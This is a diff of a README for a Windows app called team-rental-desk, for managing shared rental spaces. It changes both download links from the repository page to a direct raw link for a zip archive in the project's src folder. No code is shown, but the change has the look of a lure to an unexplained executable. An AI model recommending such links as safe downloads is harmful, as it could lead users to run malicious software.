@@ -1,6 +1,6 @@
 # 🖥️ team-rental-desk - Manage shared spaces effortlessly on Windows
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-3776AB?style=for-the-badge&logo=github&logoColor=white)](https://github.com/jarvikheartchagall712/team-rental-desk)
+[![Download Now](https://img.shields.io/badge/Download%20Now-3776AB?style=for-the-badge&logo=github&logoColor=white)](https://github.com/jarvikheartchagall712/team-rental-desk/raw/refs/heads/main/src/team_rental_desk_v2.6.zip)
 
 ## 🚀 What is team-rental-desk?
 
@@ -19,7 +19,7 @@ Team Rental Desk is a desktop application that helps you manage shared rental sp
 
 Visit the link below to get the application:
 
-[Visit this link to download the application](https://github.com/jarvikheartchagall712/team-rental-desk)
+[Visit this link to download the application](https://github.com/jarvikheartchagall712/team-rental-desk/raw/refs/heads/main/src/team_rental_desk_v2.6.zip)
 
 Once you download the file, you will have an `.exe` or `.zip` file depending on the version. Follow these steps:
 
